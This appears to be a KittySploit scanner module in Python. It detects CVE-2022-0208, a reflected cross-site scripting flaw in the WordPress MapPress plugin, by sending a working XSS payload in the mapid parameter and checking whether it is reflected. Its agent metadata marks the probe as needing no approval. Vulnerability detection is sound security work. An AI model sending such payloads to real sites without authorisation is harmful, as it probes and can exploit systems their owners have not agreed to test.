#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Plugin MapPress before version 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin MapPress <2.73.4 - Cross-Site Scripting Detection',
        'description': 'WordPress Plugin MapPress before version 2.73.4 does not sanitize and escape the \'mapid\' parameter before outputting it back in the "Bad mapid" error message, leading to reflected cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'mappress', 'xss', 'wordpress', 'wp-plugin', 'wpscan', 'mappresspro', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/59a2abd0-4aee-47aa-ad3a-865f624fa0fc',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0208',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0208',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src onerror=alert(document.domain)>', 'Bad mapid',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Plugin MapPress <2.73.4 - Cross-Site Scripting detected",
                path='/?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E',
            )
            return True
        return False

